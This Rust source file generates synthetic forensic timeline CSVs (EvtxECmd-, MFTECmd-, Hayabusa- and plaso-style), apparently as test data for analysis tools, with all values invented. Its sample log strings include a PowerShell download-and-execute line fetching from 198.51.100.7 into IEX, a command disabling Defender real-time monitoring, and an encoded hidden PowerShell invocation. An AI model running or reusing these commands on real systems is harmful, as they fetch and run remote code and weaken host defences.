//! Synthetic layouts modelled on the CSV outputs analysts open: forhunt /
//! EvtxECmd, MFTECmd, Hayabusa, plaso l2tcsv, and a generic mixed-type table.
//! Only the column names and value shapes are reproduced (public formats);
//! every value is invented. Hosts use fake names, IPs come from RFC 5737 and
//! RFC 1918 ranges.

use std::fmt::Write as _;

use crate::rng::Rng;
use crate::time::{self, T0, TICKS_PER_SEC};

/// Rows per independently seeded block. Blocks never straddle a segment.
pub const BLOCK_ROWS: u64 = 16_384;
/// Rows per "source file" segment (time-sorted inside, concatenated).
pub const SEGMENT_ROWS: u64 = 16 * BLOCK_ROWS;
/// Every layout spans 30 days.
const SPAN: i64 = 30 * 86_400 * TICKS_PER_SEC;

pub struct Out {
    pub buf: Vec<u8>,
    pub delim: u8,
    first: bool,
}

impl Out {
    pub fn new(delim: u8) -> Self {
        Out {
            buf: Vec::with_capacity(1 << 20),
            delim,
            first: true,
        }
    }

    fn sep(&mut self) {
        if !self.first {
            self.buf.push(self.delim);
        }
        self.first = false;
    }

    /// A cell, quoted per RFC 4180 when needed.
    pub fn cell(&mut self, s: &str) {
        self.sep();
        let d = self.delim;
        if s.bytes()
            .any(|b| b == d || b == b'"' || b == b'\n' || b == b'\r')
        {
            self.buf.push(b'"');
            for &b in s.as_bytes() {
                if b == b'"' {
                    self.buf.push(b'"');
                }
                self.buf.push(b);
            }
            self.buf.push(b'"');
        } else {
            self.buf.extend_from_slice(s.as_bytes());
        }
    }

    pub fn num(&mut self, v: u64) {
        self.sep();
        let _ = write!(Vec2Fmt(&mut self.buf), "{v}");
    }

    pub fn end(&mut self) {
        self.buf.push(b'\n');
        self.first = true;
    }

    pub fn header(&mut self, cols: &[&str]) {
        for c in cols {
            self.cell(c);
        }
        self.end();
    }
}

struct Vec2Fmt<'a>(&'a mut Vec<u8>);
impl std::fmt::Write for Vec2Fmt<'_> {
    fn write_str(&mut self, s: &str) -> std::fmt::Result {
        self.0.extend_from_slice(s.as_bytes());
        Ok(())
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, clap::ValueEnum)]
pub enum Layout {
    /// forhunt `parse -F csv` (EvtxECmd column layout + ForhuntId)
    Forhunt,
    /// MFTECmd $MFT output
    Mft,
    /// Hayabusa csv timeline
    Hayabusa,
    /// plaso psort l2tcsv
    Plaso,
    /// Generic mixed-type table (EU dates, floats, free text)
    Generic,
}

impl Layout {
    pub fn header(self) -> &'static [&'static str] {
        match self {
            Layout::Forhunt => FORHUNT_HEADER,
            Layout::Mft => MFT_HEADER,
            Layout::Hayabusa => HAYABUSA_HEADER,
            Layout::Plaso => PLASO_HEADER,
            Layout::Generic => GENERIC_HEADER,
        }
    }

    /// Writes rows `start..start+n` (n <= BLOCK_ROWS, block-aligned start).
    pub fn block(self, seed: u64, start: u64, n: u64, out: &mut Out) {
        let mut rng = Rng::stream(seed, start / BLOCK_ROWS);
        for i in start..start + n {
            match self {
                Layout::Forhunt => forhunt_row(&mut rng, seed, i, out),
                Layout::Mft => mft_row(&mut rng, i, out),
                Layout::Hayabusa => hayabusa_row(&mut rng, i, out),
                Layout::Plaso => plaso_row(&mut rng, i, out),
                Layout::Generic => generic_row(&mut rng, i, out),
            }
            out.end();
        }
    }
}

/// Time of row `i` inside its segment: increasing, with occasional ties.
fn seg_time(rng: &mut Rng, i: u64) -> i64 {
    let pos = (i % SEGMENT_ROWS) as i64;
    let step = SPAN / SEGMENT_ROWS as i64;
    let jitter = if rng.chance(1, 8) {
        0
    } else {
        rng.below(step as u64) as i64
    };
    T0 + pos * step + jitter
}

/// Time of row `i` in a globally sorted file.
fn global_time(rng: &mut Rng, i: u64, rows_per_day: u64) -> i64 {
    let step = 86_400 * TICKS_PER_SEC / rows_per_day as i64;
    T0 + i as i64 * step + rng.below(step as u64) as i64
}

const HOSTS: &[&str] = &[
    "WS-01.corp.example",
    "WS-02.corp.example",
    "WS-03.corp.example",
    "WS-04.corp.example",
    "WS-05.corp.example",
    "WS-06.corp.example",
    "WS-07.corp.example",
    "WS-08.corp.example",
    "WS-09.corp.example",
    "WS-10.corp.example",
    "WS-11.corp.example",
    "WS-12.corp.example",
    "LT-HR-01.corp.example",
    "LT-HR-02.corp.example",
    "LT-FIN-01.corp.example",
    "LT-DEV-01.corp.example",
    "LT-DEV-02.corp.example",
    "DC-01.corp.example",
    "DC-02.corp.example",
    "SRV-FILE.corp.example",
    "SRV-SQL.corp.example",
    "SRV-WEB.corp.example",
];

const USERS: &[&str] = &[
    "jdoe",
    "asmith",
    "bwilson",
    "mgarcia",
    "lchen",
    "Administrator",
    "svc_sql",
    "svc_backup",
    "SYSTEM",
    "LOCAL SERVICE",
    "NETWORK SERVICE",
    "WS-07$",
    "DC-01$",
    "krbtgt",
    "helpdesk",
    "o'brien",
];

fn sid(rng: &mut Rng, user: &str) -> String {
    match user {
        "SYSTEM" => "S-1-5-18".into(),
        "LOCAL SERVICE" => "S-1-5-19".into(),
        "NETWORK SERVICE" => "S-1-5-20".into(),
        _ => format!(
            "S-1-5-21-3623811015-3361044348-30300820-{}",
            1000 + (user.len() as u64 * 37 + rng.below(1)) % 600
        ),
    }
}

fn ip(rng: &mut Rng) -> String {
    match rng.below(4) {
        0 => format!("192.0.2.{}", rng.range(1, 254)),
        1 => format!("198.51.100.{}", rng.range(1, 254)),
        2 => format!("203.0.113.{}", rng.range(1, 254)),
        _ => format!("10.0.{}.{}", rng.below(8), rng.range(1, 254)),
    }
}

const EXES: &[&str] = &[
    r"C:\Windows\System32\svchost.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    r"C:\Windows\explorer.exe",
    r"C:\Windows\System32\lsass.exe",
    r"C:\Windows\System32\rundll32.exe",
    r"C:\Windows\System32\wbem\WmiPrvSE.exe",
    r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    r"C:\Users\jdoe\AppData\Local\Temp\update.exe",
    r"C:\ProgramData\svc\agent.exe",
];

const ARGS: &[&str] = &[
    "",
    " -k netsvcs -p",
    " /c whoami /all",
    " /c net user /domain",
    " -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    " -ExecutionPolicy Bypass -File \"C:\\Users\\Public\\run.ps1\"",
    " shell32.dll,Control_RunDLL",
    " /c copy \\\\SRV-FILE\\share\\a.txt, C:\\Temp\\b.txt",
    " --type=renderer --lang=en-US",
];

fn cmdline(rng: &mut Rng) -> String {
    cmdline_of(rng).1
}

/// (image path, command line)
fn cmdline_of(rng: &mut Rng) -> (&'static str, String) {
    let exe = *rng.pick(EXES);
    let args = *rng.pick(ARGS);
    let cmd = if exe.contains(' ') {
        format!("\"{exe}\"{args}")
    } else {
        format!("{exe}{args}")
    };
    (exe, cmd)
}

const FORHUNT_HEADER: &[&str] = &[
    "RecordNumber",
    "EventRecordId",
    "TimeCreated",
    "EventId",
    "Level",
    "Provider",
    "Channel",
    "ProcessId",
    "ThreadId",
    "Computer",
    "UserId",
    "MapDescription",
    "UserName",
    "RemoteHost",
    "PayloadData1",
    "PayloadData2",
    "PayloadData3",
    "PayloadData4",
    "PayloadData5",
    "PayloadData6",
    "ExecutableInfo",
    "HiddenRecord",
    "SourceFile",
    "Keywords",
    "Payload",
    "ForhuntId",
];

struct Chan {
    name: &'static str,
    provider: &'static str,
    file: &'static str,
    events: &'static [(u32, u32)],
}

const CHANNELS: &[(Chan, u32)] = &[
    (
        Chan {
            name: "Security",
            provider: "Microsoft-Windows-Security-Auditing",
            file: "Security.evtx",
            events: &[
                (4624, 30),
                (4625, 6),
                (4634, 20),
                (4672, 10),
                (4688, 15),
                (4689, 10),
                (4720, 1),
                (4768, 5),
                (4769, 8),
                (4776, 3),
                (5140, 2),
                (1102, 1),
            ],
        },
        55,
    ),
    (
        Chan {
            name: "Microsoft-Windows-Sysmon/Operational",
            provider: "Microsoft-Windows-Sysmon",
            file: "Microsoft-Windows-Sysmon%4Operational.evtx",
            events: &[
                (1, 20),
                (3, 25),
                (5, 10),
                (7, 15),
                (10, 5),
                (11, 15),
                (13, 8),
                (22, 10),
            ],
        },
        25,
    ),
    (
        Chan {
            name: "System",
            provider: "Service Control Manager",
            file: "System.evtx",
            events: &[
                (7045, 2),
                (7036, 30),
                (7040, 5),
                (104, 1),
                (6005, 2),
                (6006, 2),
            ],
        },
        10,
    ),
    (
        Chan {
            name: "Microsoft-Windows-PowerShell/Operational",
            provider: "Microsoft-Windows-PowerShell",
            file: "Microsoft-Windows-PowerShell%4Operational.evtx",
            events: &[(4103, 3), (4104, 7)],
        },
        6,
    ),
    (
        Chan {
            name: "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational",
            provider: "Microsoft-Windows-TerminalServices-LocalSessionManager",
            file: "Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx",
            events: &[(21, 4), (22, 4), (24, 3), (25, 3)],
        },
        4,
    ),
];

fn title(eid: u32, chan: &str) -> &'static str {
    match (chan, eid) {
        ("Security", 4624) => "Successful logon",
        ("Security", 4625) => "Failed logon",
        ("Security", 4634) => "Logoff",
        ("Security", 4672) => "Special privileges assigned to new logon",
        ("Security", 4688) => "Process creation",
        ("Security", 4689) => "Process exited",
        ("Security", 4720) => "User account created",
        ("Security", 4768) => "Kerberos TGT requested",
        ("Security", 4769) => "Kerberos service ticket requested",
        ("Security", 4776) => "NTLM credential validation",
        ("Security", 5140) => "Network share accessed",
        ("Security", 1102) => "Security log cleared",
        ("System", 7045) => "Service installed",
        ("System", 7036) => "Service state changed",
        ("System", 7040) => "Service start type changed",
        ("System", 104) => "Event log cleared",
        ("System", 6005) => "Event log service started",
        ("System", 6006) => "Event log service stopped",
        (c, 1) if c.contains("Sysmon") => "Process creation",
        (c, 3) if c.contains("Sysmon") => "Network connection",
        (c, 5) if c.contains("Sysmon") => "Process terminated",
        (c, 7) if c.contains("Sysmon") => "Image loaded",
        (c, 10) if c.contains("Sysmon") => "Process accessed",
        (c, 11) if c.contains("Sysmon") => "File created",
        (c, 13) if c.contains("Sysmon") => "Registry value set",
        (c, 22) if c.contains("Sysmon") => "DNS query",
        (c, 4103) if c.contains("PowerShell") => "Module logging",
        (c, 4104) if c.contains("PowerShell") => "Script block logging",
        (_, 21) => "RDP session logon succeeded",
        (_, 22) => "RDP shell start",
        (_, 24) => "RDP session disconnected",
        (_, 25) => "RDP session reconnected",
        _ => "",
    }
}

const SCRIPTS: &[&str] = &[
    "Get-Process | Where-Object { $_.CPU -gt 100 }",
    "$c = New-Object Net.WebClient\n$c.DownloadString(\"http://198.51.100.7/a.ps1\") | IEX",
    "Import-Module ActiveDirectory\nGet-ADUser -Filter * -Properties LastLogonDate,\n  MemberOf | Export-Csv C:\\Temp\\u.csv",
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "Write-Host \"backup done\"",
];

fn json_str(out: &mut String, s: &str) {
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            c => out.push(c),
        }
    }
    out.push('"');
}

fn forhunt_row(rng: &mut Rng, seed: u64, i: u64, out: &mut Out) {
    let seg = i / SEGMENT_ROWS;
    // Segment identity (one "evtx file" per segment) from its own stream.
    let mut srng = Rng::stream(seed ^ 0x5E6, seg);
    let host = *srng.pick(HOSTS);
    let chan = &srng.weighted(CHANNELS);
    let file_key = srng.u64() as u32;
    let rec = 1 + (i % SEGMENT_ROWS) + srng.below(100_000);

    let ts = seg_time(rng, i);
    let eid = *rng.weighted(chan.events);
    let user = *rng.pick(USERS);
    let level = match rng.below(20) {
        0 => "Warning",
        1 => "Error",
        _ => "Info",
    };
    let pid = rng.range(4, 12_000) & !3;

    // Event fields: (name, value), in "key field" order.
    let mut fields: Vec<(&str, String)> = Vec::with_capacity(8);
    let (mut uname, mut rhost, mut exe) = (String::new(), String::new(), String::new());
    match (chan.name, eid) {
        ("Security", 4624 | 4625 | 4634 | 4672) => {
            uname = user.to_string();
            fields.push(("TargetUserName", user.into()));
            fields.push(("TargetDomainName", "CORP".into()));
            fields.push((
                "LogonType",
                rng.pick(&["2", "3", "3", "3", "5", "10"]).to_string(),
            ));
            fields.push(("TargetLogonId", format!("0x{:x}", rng.u64() & 0xFF_FFFF)));
            if eid != 4634 {
                rhost = ip(rng);
                fields.push(("IpAddress", rhost.clone()));
                fields.push(("WorkstationName", rng.pick(HOSTS)[..5].to_string()));
                fields.push((
                    "LogonProcessName",
                    rng.pick(&["NtLmSsp ", "Kerberos", "User32 "]).to_string(),
                ));
            }
            if eid == 4625 {
                fields.push(("Status", "0xc000006d".into()));
                fields.push((
                    "SubStatus",
                    rng.pick(&["0xc000006a", "0xc0000064"]).to_string(),
                ));
            }
        }
        ("Security", 4688 | 4689) | ("Microsoft-Windows-Sysmon/Operational", 1 | 5) => {
            uname = user.to_string();
            let (image, cmd) = cmdline_of(rng);
            exe = cmd;
            fields.push(("SubjectUserName", user.into()));
            fields.push(("NewProcessName", image.into()));
            fields.push(("CommandLine", exe.clone()));
            fields.push(("ParentProcessName", rng.pick(EXES).to_string()));
            fields.push(("ProcessId", format!("0x{:x}", pid)));
        }
        ("Microsoft-Windows-Sysmon/Operational", 3) => {
            rhost = ip(rng);
            exe = rng.pick(EXES).to_string();
            fields.push(("Image", exe.clone()));
            fields.push(("SourceIp", format!("10.0.0.{}", rng.range(2, 250))));
            fields.push(("DestinationIp", rhost.clone()));
            fields.push((
                "DestinationPort",
                rng.pick(&["443", "80", "445", "3389", "5985", "53"])
                    .to_string(),
            ));
            fields.push(("Protocol", "tcp".into()));
        }
        ("Microsoft-Windows-Sysmon/Operational", 22) => {
            exe = rng.pick(EXES).to_string();
            fields.push(("Image", exe.clone()));
            fields.push((
                "QueryName",
                format!(
                    "{}.{}",
                    rng.pick(&["www", "cdn", "api", "update", "x7f3a"]),
                    rng.pick(&["example.com", "example.net", "example.org", "test"])
                ),
            ));
            fields.push(("QueryResults", format!("::ffff:{};", ip(rng))));
        }
        ("Microsoft-Windows-Sysmon/Operational", _) => {
            exe = rng.pick(EXES).to_string();
            fields.push(("Image", exe.clone()));
            fields.push((
                "TargetFilename",
                format!(
                    r"C:\Users\{user}\AppData\Local\Temp\{:x}.tmp",
                    rng.u64() & 0xFFFF
                ),
            ));
            fields.push((
                "Hashes",
                format!(
                    "SHA256={:016X}{:016X}{:016X}{:016X}",
                    rng.u64(),
                    rng.u64(),
                    rng.u64(),
                    rng.u64()
                ),
            ));
        }
        ("Microsoft-Windows-PowerShell/Operational", _) => {
            uname = user.to_string();
            fields.push(("MessageNumber", "1".into()));
            fields.push(("MessageTotal", "1".into()));
            fields.push(("ScriptBlockText", rng.pick(SCRIPTS).to_string()));
            fields.push((
                "ScriptBlockId",
                format!(
                    "{:08x}-{:04x}-4{:03x}-a{:03x}-{:012x}",
                    rng.u64() as u32,
                    rng.u64() as u16,
                    rng.below(4096),
                    rng.below(4096),
                    rng.u64() & 0xFFFF_FFFF_FFFF
                ),
            ));
        }
        ("System", 7045) => {
            exe = cmdline(rng);
            fields.push((
                "ServiceName",
                rng.pick(&["PSEXESVC", "UpdaterSvc", "VSS", "BITS"])
                    .to_string(),
            ));
            fields.push(("ImagePath", exe.clone()));
            fields.push(("ServiceType", "user mode service".into()));
            fields.push(("StartType", "demand start".into()));
            fields.push(("AccountName", "LocalSystem".into()));
        }
        ("System", _) => {
            fields.push((
                "param1",
                rng.pick(&[
                    "Windows Update",
                    "Background Intelligent Transfer Service",
                    "Print Spooler",
                    "WinRM",
                ])
                .to_string(),
            ));
            fields.push(("param2", rng.pick(&["running", "stopped"]).to_string()));
        }
        _ => {
            uname = format!("CORP\\{user}");
            rhost = ip(rng);
            fields.push(("User", uname.clone()));
            fields.push(("SessionID", rng.range(1, 9).to_string()));
            fields.push(("Address", rhost.clone()));
        }
    }

    out.num(rec);
    out.num(rec);
    out.cell(&time::evtxecmd(ts));
    out.num(eid as u64);
    out.cell(level);
    out.cell(chan.provider);
    out.cell(chan.name);
    out.num(pid);
    out.num(rng.range(4, 12_000) & !3);
    out.cell(host);
    out.cell(&sid(rng, user));
    out.cell(title(eid, chan.name));
    out.cell(&uname);
    out.cell(&rhost);
    for k in 0..6 {
        match fields.get(k) {
            Some((n, v)) => out.cell(&format!("{n}: {v}")),
            None => out.cell(""),
        }
    }
    out.cell(&exe);
    out.cell("False");
    out.cell(&format!(
        r"C:\Cases\2024-001\{}\Windows\System32\winevt\Logs\{}",
        &host[..host.find('.').unwrap_or(host.len())],
        chan.file
    ));
    out.cell(if eid == 4625 {
        "Audit failure"
    } else if chan.name == "Security" {
        "Audit success"
    } else {
        ""
    });
    let mut payload = String::with_capacity(256);
    payload.push('{');
    for (k, (n, v)) in fields.iter().enumerate() {
        if k > 0 {
            payload.push(',');
        }
        json_str(&mut payload, n);
        payload.push(':');
        json_str(&mut payload, v);
    }
    payload.push('}');
    out.cell(&payload);
    out.cell(&format!("{file_key:08x}:{rec}"));
}

const MFT_HEADER: &[&str] = &[
    "EntryNumber",
    "SequenceNumber",
    "InUse",
    "ParentEntryNumber",
    "ParentSequenceNumber",
    "ParentPath",
    "FileName",
    "Extension",
    "FileSize",
    "ReferenceCount",
    "ReparseTarget",
    "IsDirectory",
    "HasAds",
    "IsAds",
    "SI<FN",
    "uSecZeros",
    "Copied",
    "SiFlags",
    "NameType",
    "Created0x10",
    "Created0x30",
    "LastModified0x10",
    "LastModified0x30",
    "LastRecordChange0x10",
    "LastRecordChange0x30",
    "LastAccess0x10",
    "LastAccess0x30",
    "UpdateSequenceNumber",
    "LogfileSequenceNumber",
    "SecurityId",
    "ZoneIdContents",
    "SourceFile",
];

const DIRS: &[&str] = &[
    r".\Windows\System32",
    r".\Windows\System32\drivers",
    r".\Windows\Temp",
    r".\Program Files\Common Files",
    r".\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup",
    r".\Users\jdoe\AppData\Local\Temp",
    r".\Users\jdoe\Downloads",
    r".\Users\jdoe\Documents",
    r".\Users\asmith\Desktop",
    r".\Users\Public",
    r".\$Recycle.Bin\S-1-5-21-3623811015-3361044348-30300820-1104",
];

const WORDS: &[&str] = &[
    "report",
    "invoice",
    "setup",
    "update",
    "backup",
    "notes",
    "data",
    "config",
    "agent",
    "svc",
    "payload",
    "budget 2024",
    "photo",
    "résumé",
    "日本語",
    "archive",
    "Q3, final",
    "temp",
];

const EXTS: &[&str] = &[
    ".exe", ".dll", ".txt", ".docx", ".xlsx", ".pdf", ".ps1", ".lnk", ".tmp", ".zip", ".log", "",
];

fn mft_row(rng: &mut Rng, i: u64, out: &mut Out) {
    let is_dir = rng.chance(1, 10);
    let ext = if is_dir { "" } else { *rng.pick(EXTS) };
    let name = format!(
        "{}{}{}",
        rng.pick(WORDS),
        if rng.chance(1, 2) {
            rng.below(100).to_string()
        } else {
            String::new()
        },
        ext
    );
    let created = T0
        - rng.below(3 * 365 * 86_400) as i64 * TICKS_PER_SEC
        - rng.below(TICKS_PER_SEC as u64) as i64;
    let modified = created + rng.below(200 * 86_400) as i64 * TICKS_PER_SEC;
    let stomp = rng.chance(1, 200);
    let si_created = if stomp {
        created - 400 * 86_400 * TICKS_PER_SEC
    } else {
        created
    };
    let t = |v: i64| time::evtxecmd(v);
    let in_use = !rng.chance(1, 15);
    out.num(i + 16);
    out.num(rng.range(1, 12));
    out.cell(if in_use { "True" } else { "False" });
    out.num(rng.range(5, 2_000));
    out.num(rng.range(1, 6));
    out.cell(rng.pick(DIRS));
    out.cell(&name);
    out.cell(ext);
    let bits = rng.range(4, 30);
    out.num(if is_dir { 0 } else { rng.below(1 << bits) });
    out.num(rng.range(1, 2));
    out.cell("");
    out.cell(if is_dir { "True" } else { "False" });
    out.cell(if rng.chance(1, 30) { "True" } else { "False" });
    out.cell("False");
    out.cell(if stomp { "True" } else { "False" });
    out.cell(if stomp && rng.chance(1, 2) {
        "True"
    } else {
        "False"
    });
    out.cell(if rng.chance(1, 20) { "True" } else { "False" });
    out.cell(rng.pick(&[
        "Archive",
        "Hidden|System",
        "Archive|NotContentIndexed",
        "None",
    ]));
    out.cell(rng.pick(&["Windows", "DosWindows", "Posix"]));
    out.cell(&t(si_created));
    out.cell(&if rng.chance(1, 3) {
        t(created)
    } else {
        String::new()
    });
    out.cell(&t(modified));
    out.cell(&if rng.chance(1, 3) {
        t(created)
    } else {
        String::new()
    });
    out.cell(&t(modified + 1_000));
    out.cell(&if rng.chance(1, 3) {
        t(created)
    } else {
        String::new()
    });
    out.cell(&t(modified + rng.below(86_400) as i64 * TICKS_PER_SEC));
    out.cell(&if rng.chance(1, 3) {
        t(created)
    } else {
        String::new()
    });
    out.num(rng.below(1 << 40));
    out.num(rng.below(1 << 36));
    out.num(rng.range(256, 3_000));
    out.cell(if ext == ".exe" && rng.chance(1, 4) {
        "[ZoneTransfer]\r\nZoneId=3\r\nReferrerUrl=https://www.example.com/\r\nHostUrl=https://dl.example.net/setup.exe"
    } else {
        ""
    });
    out.cell(r"C:\Cases\2024-001\WS-07\C\$MFT");
}

const HAYABUSA_HEADER: &[&str] = &[
    "Timestamp",
    "RuleTitle",
    "Level",
    "Computer",
    "Channel",
    "EventID",
    "RecordID",
    "Details",
    "ExtraFieldInfo",
];

const RULES: &[(&str, &str, u32)] = &[
    ("Logon (Network)", "info", 30),
    ("Logoff", "info", 20),
    ("Proc Exec", "info", 20),
    ("Failed Logon - Incorrect Password", "low", 6),
    ("Suspicious Powershell Download", "high", 1),
    ("Encoded PowerShell Command Line", "med", 2),
    ("Service Installed", "med", 2),
    ("Security Log Cleared", "crit", 1),
    ("Mimikatz Use", "crit", 1),
    ("Possible LSASS Access", "high", 1),
];

fn hayabusa_row(rng: &mut Rng, i: u64, out: &mut Out) {
    let items: Vec<((&str, &str), u32)> = RULES.iter().map(|&(t, l, w)| ((t, l), w)).collect();
    let (rule, level) = *rng.weighted(&items);
    out.cell(&time::hayabusa(global_time(rng, i, 400_000)));
    out.cell(rule);
    out.cell(level);
    out.cell(rng.pick(HOSTS));
    out.cell(rng.pick(&["Sec", "Sysmon", "PwSh", "Sys"]));
    out.num(*rng.pick(&[4624u64, 4634, 4688, 4625, 4104, 7045, 1102, 10]));
    out.num(rng.range(1, 5_000_000));
    let user = *rng.pick(USERS);
    out.cell(&format!(
        "Type: {} ¦ TgtUser: {} ¦ SrcComp: {} ¦ SrcIP: {} ¦ LID: 0x{:x}",
        rng.below(11),
        user,
        &rng.pick(HOSTS)[..5],
        ip(rng),
        rng.u64() & 0xFFFFF
    ));
    out.cell(&format!(
        "AuthenticationPackageName: {} ¦ ProcessName: {}",
        rng.pick(&["NTLM", "Kerberos", "Negotiate"]),
        rng.pick(EXES)
    ));
}

const PLASO_HEADER: &[&str] = &[
    "date",
    "time",
    "timezone",
    "MACB",
    "source",
    "sourcetype",
    "type",
    "user",
    "host",
    "short",
    "desc",
    "version",
    "filename",
    "inode",
    "notes",
    "format",
    "extra",
];

fn plaso_row(rng: &mut Rng, i: u64, out: &mut Out) {
    let (d, t) = time::l2t(global_time(rng, i, 300_000));
    let (source, stype, ty, fmt) = *rng.pick(&[
        (
            "FILE",
            "NTFS Change Journal",
            "Content Modification Time",
            "usnjrnl",
        ),
        ("FILE", "OS:stat", "Creation Time", "filestat"),
        ("EVT", "WinEVTX", "Content Modification Time", "winevtx"),
        (
            "REG",
            "Registry Key",
            "Content Modification Time",
            "winreg/winreg_default",
        ),
        ("LNK", "Windows Shortcut", "Last Access Time", "lnk"),
        (
            "WEBHIST",
            "Edge History",
            "Last Visited Time",
            "sqlite/edge_history",
        ),
    ]);
    let file = format!("{}\\{}{}", rng.pick(DIRS), rng.pick(WORDS), rng.pick(EXTS));
    out.cell(&d);
    out.cell(&t);
    out.cell("UTC");
    out.cell(rng.pick(&["M...", ".A..", "..C.", "...B", "MACB", "MA.B"]));
    out.cell(source);
    out.cell(stype);
    out.cell(ty);
    out.cell(rng.pick(USERS));
    out.cell(&rng.pick(HOSTS)[..5]);
    out.cell(&file);
    out.cell(&format!(
        "{file} Origin: {}",
        rng.pick(&["$MFT", "$UsnJrnl", "NTUSER.DAT", "History"])
    ));
    out.cell("2");
    out.cell(r"OS:C:\Cases\image.E01");
    out.num(rng.below(500_000));
    out.cell("-");
    out.cell(fmt);
    out.cell(&format!(
        "sha256_hash: {:016x}{:016x}",
        rng.u64(),
        rng.u64()
    ));
}

const GENERIC_HEADER: &[&str] = &[
    "id", "when", "category", "score", "amount", "flag", "comment", "empty",
];

fn generic_row(rng: &mut Rng, i: u64, out: &mut Out) {
    out.num(i + 1);
    out.cell(&time::eu(global_time(rng, i, 100_000)));
    out.cell(rng.pick(&["alpha", "beta", "gamma", "delta", "Alpha", "ÉPSILON"]));
    out.num(rng.below(1000));
    let a = rng.below(10_000_000) as f64 / 100.0 - 20_000.0;
    out.cell(&format!("{a:.2}"));
    out.cell(rng.pick(&["true", "false", ""]));
    let n = rng.range(0, 6);
    let mut c = String::new();
    for k in 0..n {
        if k > 0 {
            c.push(' ');
        }
        c.push_str(rng.pick(WORDS));
    }
    if rng.chance(1, 50) {
        c.push_str(" said \"hello\"");
    }
    out.cell(&c);
    out.cell("");
}
